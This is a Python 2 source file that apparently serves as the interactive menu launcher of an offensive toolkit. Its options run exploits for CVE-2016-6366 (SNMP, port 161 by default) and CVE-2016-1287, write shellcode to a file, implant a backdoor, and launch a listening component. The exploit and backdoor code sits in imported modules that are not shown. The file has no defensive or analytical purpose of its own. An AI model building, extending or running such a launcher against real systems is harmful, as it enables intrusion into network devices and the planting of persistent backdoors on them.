# -*- coding:utf-8 -*-
#!/usr/bin/python

from conf import *
from cui import *
from shellcode import *
from operate import *
import os

def setup_and_run():
    global gl_Conf

    global_config(True)
    CUI.show_main_interface()
    print ""
    while True:
        choose = raw_input("# ")

        if choose.lower() == "h":
            CUI.show_main_interface()
        elif choose.lower() == "q":
            os._exit(0)
        elif choose == "c":
            global_config()
        elif choose == "1":
            if gl_Conf.targetPort is None:
                gl_Conf.targetPort = 161
            exec_exploit("CVE-2016-6366")
        elif choose == "2":
            exec_exploit("CVE-2016-1287")
        elif choose == "3":
            #output shellcode
            output_shellcode_to_file()
        elif choose == "4":
            implant_backdoor()
        elif choose == "7":
            lauch_lp()
        elif len(choose) == 0:
            continue
        else:
            CUI.show_main_interface()

        print ""


if __name__ == '__main__':
    setup_and_run()